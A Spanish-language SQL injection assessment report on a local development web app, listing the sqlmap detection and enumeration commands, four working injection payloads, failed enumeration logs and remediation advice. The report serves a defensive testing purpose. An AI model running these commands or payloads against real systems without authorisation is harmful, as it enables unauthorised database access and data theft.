# Informe de Análisis SQLi - web.dev.local:8083

Fecha: 2026-04-27 10:12:33 UTC
Objetivo: http://web.dev.local:8083

## Resumen Ejecutivo

Se detectó una vulnerabilidad de inyección SQL (SQL Injection) en el parámetro GET 'id' de la página principal. sqlmap identificó múltiples técnicas explotables (boolean-based blind, error-based, time-based, UNION). Se intentó la extracción de información sensible usando sqlmap; la enumeración del usuario actual se intentó y la lista de bases de datos no pudo recuperarse completamente mediante las técnicas automáticas empleadas.

## Vectores Analizados

- GET parameter: id (en URL http://web.dev.local:8083/?id=1)
- Formulario HTML con método GET y campo 'id' detectado en la página principal

## Hallazgos

1) Parámetro vulnerable: id (GET)
   - Técnicas detectadas por sqlmap:
     - boolean-based blind
     - error-based
     - time-based blind
     - UNION-based (2 columns)
   - Payload reportado por sqlmap (ejemplo):
     id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit

2) Comando sqlmap usado para detección:
   - sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --level=3 --risk=2

3) Comando sqlmap usado para explotación tentativa (enumeración):
   - sqlmap -u "http://web.dev.local:8083/?id=1" --batch -p id --current-user --dbs --level=3 --risk=2

## Evidencia de Escaneo (extractos relevantes de sqlmap)

- Resumen de salida de sqlmap (detección):

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=4153' OR (SELECT 9928 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(9928=9928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aUPR&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=4153' AND (SELECT 6369 FROM (SELECT(SLEEP(5)))lKPY)-- nHYh&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=4153' UNION ALL SELECT CONCAT(0x7178717671,0x686a79514a4a4967666c6c4b7769736a77536b597869554e6e56704754587648705a65445a7a6e46,0x717a6b6271),NULL-- -&Submit=Submit
```

- Extracción tentativa (enumeración current-user / dbs):

```
[12:13:08] [INFO] fetching current user
[12:13:09] [INFO] fetched: 
[12:13:09] [ERROR] unable to retrieve the number of databases
[12:13:09] [CRITICAL] unable to retrieve the database names
```

## Evidencia de Explotación

- Resultado: Enumeración parcial. sqlmap confirmó la presencia de inyección y pudo identificar técnicas y payloads explotables, pero no logró recuperar nombres de bases de datos con la ejecución automatizada empleada en este intento. No se extrajeron usuarios/contraseñas claros durante la ejecución automática.

- Archivos de evidencia guardados por sqlmap en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

## Recomendaciones

1) Validar y sanear el parámetro 'id' en el servidor (usar consultas parametrizadas / prepared statements). Evitar concatenar directamente parámetros de usuario en consultas SQL.
2) Implementar WAF o reglas de filtrado mientras se corrige el código.
3) Revisar y aplicar el principio de menor privilegio sobre las cuentas de la base de datos.
4) Ejecutar una auditoría de seguridad más profunda con opciones de sqlmap adicionales (e.g., --no-cast, --hex, --threads, --timeout adjustments) y revisión manual del código fuente.

## Conclusión

Se confirmó una vulnerabilidad de inyección SQL en el parámetro 'id'. La explotación automatizada con sqlmap demostró la inyectabilidad y proporcionó payloads reproducibles, aunque la extracción completa de bases de datos no fue exitosa con los parámetros por defecto. Se recomienda mitigar inmediatamente y realizar pruebas adicionales.
